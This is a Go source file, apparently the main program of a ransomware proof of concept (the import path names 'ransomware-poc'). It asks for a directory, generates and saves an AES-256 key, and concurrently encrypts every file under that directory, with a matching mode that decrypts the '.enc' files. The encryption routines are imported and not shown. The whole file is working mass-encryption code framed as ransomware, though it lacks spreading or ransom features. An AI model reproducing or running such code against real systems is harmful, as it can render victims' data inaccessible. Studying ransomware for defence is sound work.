package main

import (
	"fmt"
	"github.com/arviiyer/ransomware-poc/decryption" // Import the decryption package
	"github.com/arviiyer/ransomware-poc/encryption" // Import the encryption package
	"os"
	"path/filepath"
	"strings"
	"sync"
)

// Get the user's choice (Encrypt or Decrypt)
func getUserChoice() string {
	var choice string
	fmt.Print("Would you like to encrypt or decrypt? (e/d): ")
	fmt.Scanln(&choice)
	choice = strings.TrimSpace(strings.ToLower(choice))
	return choice
}

// Get directory path from the user
func getUserInput() string {
	var dirPath string
	fmt.Print("Enter directory path: ")
	fmt.Scanln(&dirPath)
	fmt.Println("Entered directory path: ", dirPath)
	return dirPath
}

func main() {
	// Ask the user if they want to encrypt or decrypt
	choice := getUserChoice()

	// Get the directory from the user
	dirPath := getUserInput()

	// Perform the requested action (encrypt or decrypt)
	switch choice {
	case "e":
		// Generate a random AES-256 encryption key and save it to a file
		key, err := encryption.GenerateAndSaveAESKey()
		if err != nil {
			fmt.Println("Error generating and saving AES key:", err)
			return
		}

		// Encrypt all files in the directory using the generated key with concurrency
		err = encryptFilesConcurrently(dirPath, key)
		if err != nil {
			fmt.Println("Error encrypting files in the directory:", err)
		} else {
			fmt.Println("All files in the directory were encrypted successfully!")
		}

	case "d":
		// Load the saved AES key from the key directory
		key, err := decryption.LoadAESKey()
		if err != nil {
			fmt.Println("Error loading AES key:", err)
			return
		}

		// Decrypt all .enc files in the directory using the loaded key with concurrency
		err = decryptFilesConcurrently(dirPath, key)
		if err != nil {
			fmt.Println("Error decrypting files in the directory:", err)
		} else {
			fmt.Println("All .enc files in the directory were decrypted successfully!")
		}

	default:
		fmt.Println("Invalid choice. Please enter 'e' to encrypt or 'd' to decrypt.")
	}
}

// encryptFilesConcurrently encrypts all files in a given directory concurrently
func encryptFilesConcurrently(dirPath string, key []byte) error {
	var wg sync.WaitGroup
	semaphore := make(chan struct{}, 10) // Allow only 10 concurrent goroutines

	err := filepath.Walk(dirPath, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}
		if !info.IsDir() {
			wg.Add(1)
			semaphore <- struct{}{} // Acquire semaphore
			go func(filePath string) {
				defer wg.Done()
				defer func() { <-semaphore }() // Release semaphore

				if err := encryption.EncryptFile(filePath, key); err != nil {
					fmt.Printf("Failed to encrypt file %s: %v\n", filePath, err)
				} else {
					fmt.Printf("Encrypted %s successfully\n", filePath)
				}
			}(path)
		}
		return nil
	})

	wg.Wait() // Wait for all goroutines to finish
	return err
}

// decryptFilesConcurrently decrypts all .enc files in a given directory concurrently
func decryptFilesConcurrently(dirPath string, key []byte) error {
	var wg sync.WaitGroup
	semaphore := make(chan struct{}, 10) // Allow only 10 concurrent goroutines

	err := filepath.Walk(dirPath, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}
		if !info.IsDir() && strings.HasSuffix(path, ".enc") {
			wg.Add(1)
			semaphore <- struct{}{} // Acquire semaphore
			go func(filePath string) {
				defer wg.Done()
				defer func() { <-semaphore }() // Release semaphore

				if err := decryption.DecryptFile(filePath, key); err != nil {
					fmt.Printf("Failed to decrypt file %s: %v\n", filePath, err)
				} else {
					fmt.Printf("Decrypted %s successfully\n", filePath)
				}
			}(path)
		}
		return nil
	})

	wg.Wait() // Wait for all goroutines to finish
	return err
}

